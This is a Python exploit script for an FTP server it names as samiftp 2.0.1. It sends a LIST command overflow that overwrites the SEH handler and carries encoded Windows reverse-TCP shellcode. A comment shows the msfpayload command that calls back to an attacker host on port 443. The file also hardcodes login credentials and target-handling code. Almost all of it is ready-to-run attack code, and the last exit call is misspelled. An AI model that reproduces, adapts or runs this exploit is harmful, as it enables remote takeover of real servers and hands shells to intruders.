#!/usr/bin/python 
import os,sys,time,socket

#---------------------------------------------------------------------------#
# 				Name:	Rio Atmadja			    #
# 			      Script: 	samiftp_2.0.1 exploit		    #
#---------------------------------------------------------------------------#

if len(sys.argv) != 2:
	print "[*] Usage: %s <ip_address> \n" % sys.argv[0]
	sys.exit(0)

target = sys.argv[1]

# msfpayload windows/shell_reverse_tcp LHOST=192.168.10.1 LPORT=443 R | msfencode -b "\x00\x0a\x5c" -t c
shellcode = ("\xda\xc2\xd9\x74\x24\xf4\xbd\xf9\x8d\x12\xb5\x58\x29\xc9\xb1"
"\x4f\x31\x68\x19\x03\x68\x19\x83\xe8\xfc\x1b\x78\xee\x5d\x52"
"\x83\x0f\x9e\x04\x0d\xea\xaf\x16\x69\x7e\x9d\xa6\xf9\xd2\x2e"
"\x4d\xaf\xc6\xa5\x23\x78\xe8\x0e\x89\x5e\xc7\x8f\x3c\x5f\x8b"
"\x4c\x5f\x23\xd6\x80\xbf\x1a\x19\xd5\xbe\x5b\x44\x16\x92\x34"
"\x02\x85\x02\x30\x56\x16\x23\x96\xdc\x26\x5b\x93\x23\xd2\xd1"
"\x9a\x73\x4b\x6e\xd4\x6b\xe7\x28\xc5\x8a\x24\x2b\x39\xc4\x41"
"\x9f\xc9\xd7\x83\xee\x32\xe6\xeb\xbc\x0c\xc6\xe1\xbd\x49\xe1"
"\x19\xc8\xa1\x11\xa7\xca\x71\x6b\x73\x5f\x64\xcb\xf0\xc7\x4c"
"\xed\xd5\x91\x07\xe1\x92\xd6\x40\xe6\x25\x3b\xfb\x12\xad\xba"
"\x2c\x93\xf5\x98\xe8\xff\xae\x81\xa9\xa5\x01\xbe\xaa\x02\xfd"
"\x1a\xa0\xa1\xea\x1c\xeb\xad\xdf\x12\x14\x2e\x48\x25\x67\x1c"
"\xd7\x9d\xef\x2c\x90\x3b\xf7\x53\x8b\xfb\x67\xaa\x34\xfb\xae"
"\x69\x60\xab\xd8\x58\x09\x20\x19\x64\xdc\xe6\x49\xca\x8f\x46"
"\x3a\xaa\x7f\x2e\x50\x25\x5f\x4e\x5b\xef\xd6\x49\xcc\xd0\x41"
"\x5f\x0c\xb9\x93\x5f\x0f\x82\x1d\xb9\x65\xe4\x4b\x12\x12\x9d"
"\xd1\xe8\x83\x62\xcc\x78\x27\xf0\x8b\x78\x2e\xe9\x03\x2f\x67"
"\xdf\x5d\xa5\x95\x46\xf4\xdb\x67\x1e\x3f\x5f\xbc\xe3\xbe\x5e"
"\x31\x5f\xe5\x70\x8f\x60\xa1\x24\x5f\x37\x7f\x92\x19\xe1\x31"
"\x4c\xf0\x5e\x98\x18\x85\xac\x1b\x5e\x8a\xf8\xed\xbe\x3b\x55"
"\xa8\xc1\xf4\x31\x3c\xba\xe8\xa1\xc3\x11\xa9\xd2\x89\x3b\x98"
"\x7a\x54\xae\x98\xe6\x67\x05\xde\x1e\xe4\xaf\x9f\xe4\xf4\xda"
"\x9a\xa1\xb2\x37\xd7\xba\x56\x37\x44\xba\x72")

seh = "\x80\x14\x02\x10" # 0x10021480 ( C:\Program Files\PMSystem\Temp\tmp0.dll)
nseh = "\xeb\x06\x90\x90"# jmp short 6 bytes 

payload = '\x41' * 453 + nseh + seh + '\x81\xc4\x48\xf4\xff\xff'  + shellcode 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Connect to %s on port %d " % (target,21)
try:

	s.connect((target,21))
	s.recv(1024) 
	s.send('USER jeff\r\n')
	s.recv(1024)
	s.send('PASS 123qwe\r\n')
	s.recv(1024)
	s.send("LIST" + payload + "\r\n" )
	print "[+] Sending payload of size " + str(len(payload)) + " Bytes"
	s.close()
	print "[+] Exploit Sent Sucessfully" 

except:
	print "[-] Could not connect to " + target + ":21\r"
	sys.exti(0)








